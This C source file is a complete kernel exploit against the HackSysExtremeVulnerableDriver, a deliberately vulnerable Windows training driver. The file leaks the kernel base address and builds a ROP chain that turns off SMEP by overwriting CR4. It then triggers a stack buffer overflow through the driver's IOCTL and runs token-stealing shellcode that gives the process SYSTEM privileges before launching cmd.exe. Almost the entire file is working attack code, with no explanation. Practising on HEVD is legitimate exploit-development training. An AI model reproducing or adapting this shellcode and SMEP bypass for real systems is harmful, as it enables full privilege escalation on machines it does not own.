#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800)

typedef struct {
    LPVOID PopRcxRet;
    LPVOID Cr4RegValue;
    LPVOID MovCr4EcxRet;
} ROP, * PROP;

LPVOID kernelBase() {

    printf("[*] Preparing kernel information leak\n");

    LPVOID drivers[1000];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, 1000, &cbNeeded);
    LPVOID kernelBaseAddr = drivers[0];
    printf("\t[+] Kernel base address @  0x%p\n", kernelBaseAddr);

    return kernelBaseAddr;
}

int main() {
    HANDLE driverHandle;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    LPVOID lpvPayload;
    ROP DisableSMEP, EnableSMEP;

    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    CHAR ShellCode[] = 
        "\x41\x50\x41\x51\x52\x51\x50" // push r8, r9, rdx, rcx, rax
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		; Get _ETHREAD pointer from KPCR
        "\x4C\x8B\x82\xB8\x00\x00\x00"		// mov r8, [rdx + b8h]		; _EPROCESS (kd> u PsGetCurrentProcess)
        "\x4D\x8B\x88\x48\x04\x00\x00"		// mov r9, [r8 + 448h]		; ActiveProcessLinks list head
        "\x49\x8B\x09"				// mov rcx, [r9]		; Follow link to first process in list
        //find_system_proc:
        "\x48\x8B\x51\xF8"			// mov rdx, [rcx - 8]		; Offset from ActiveProcessLinks to UniqueProcessId
        "\x48\x83\xFA\x04"			// cmp rdx, 4			; Process with ID 4 is System process
        "\x74\x05"				// jz found_system		; Found SYSTEM token
        "\x48\x8B\x09"				// mov rcx, [rcx]		; Follow _LIST_ENTRY Flink pointer
        "\xEB\xF1"				// jmp find_system_proc		; Loop
        //found_system:
        "\x48\x8B\x41\x70"			// mov rax, [rcx + 70h]		; Offset from ActiveProcessLinks to Token
        "\x24\xF0"				// and al, 0f0h			; Clear low 4 bits of _EX_FAST_REF structure
        "\x49\x89\x80\xB8\x04\x00\x00"		// mov [r8 + 4b8h], rax		; Copy SYSTEM token to current process's token
        //recover:
        "\x48\x31\xF6"				// xor rsi, rsi			; Zeroing out rsi register to avoid Crash
        "\x48\x31\xFF"				// xor rdi, rdi			; Zeroing out rdi register to avoid Crash
        "\x58\x59\x5A\x41\x59\x41\x58"  // popopopoppop
        "\x48\x83\xc4\x10"			// add rsp, 40h			; Set Stack Pointer to SMEP enable ROP chain
        "\x48\x31\xC0"				// xor rax, rax			; NTSTATUS Status = STATUS_SUCCESS
        "\xc3"					// ret				
        ;

    printf("[*] Preparing shellcode\n");
    lpvPayload = VirtualAlloc(
        NULL,				// Next page to commit
        sizeof(ShellCode),		// Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    if (lpvPayload == NULL) {
        printf("\t[-] Failed to create shellcode memory\n");
        exit(1);
    }
    memcpy(lpvPayload, ShellCode, sizeof(ShellCode));
    printf("\t[+] Success to create shellcode\n");

    printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        return 0;
    }
    printf("\t[+] Success to open handle\n");

    LPVOID kernelBaseAddr = kernelBase();

    printf("[*] Preparing SMEP Bypass ROP Chain\n");
    DisableSMEP.PopRcxRet = (LPVOID)((INT_PTR)kernelBaseAddr + 0x3F01C0);
    DisableSMEP.Cr4RegValue = (PUCHAR)0x2506f8;
    DisableSMEP.MovCr4EcxRet = (LPVOID)((INT_PTR)kernelBaseAddr + 0x9A35E1);
    EnableSMEP.PopRcxRet = (LPVOID)((INT_PTR)kernelBaseAddr + 0x3F01C0);
    EnableSMEP.Cr4RegValue = (PUCHAR)0x3506f8;
    EnableSMEP.MovCr4EcxRet = (LPVOID)((INT_PTR)kernelBaseAddr + 0x9A35E1);

    printf("\t[+] pop rcx ; ret @ 0x%p\n", DisableSMEP.PopRcxRet);
    printf("\t[+] new CR4 @ 0x%p\n", DisableSMEP.Cr4RegValue);
    printf("\t[+] mov cr4, ecx ; ret @ 0x%p\n", DisableSMEP.MovCr4EcxRet);


    printf("[*] Preparing buf\n");

    char* buf = (char*)VirtualAlloc(NULL, 0x850, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    SecureZeroMemory(buf, 0x850);

    memset(buf, 0x00, 0x818);
    memcpy(buf + 0x818, &DisableSMEP, sizeof(ROP));
    memcpy(buf + 0x818 + 0x8 * 3, &lpvPayload, sizeof(LPVOID));
    //memcpy(buf + 0x818 + 0x8 * 4, &EnableSMEP, sizeof(ROP));

    printf("[*] Send payload\n");
    if (!DeviceIoControl(driverHandle, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, buf, 0x838, NULL, 0, NULL, NULL)) {
        printf("\t[-] Error sending IOCTL to driver\n");
        return 0;
    }
   

    printf("\t[+] Success\n");
    system("cmd.exe");
}
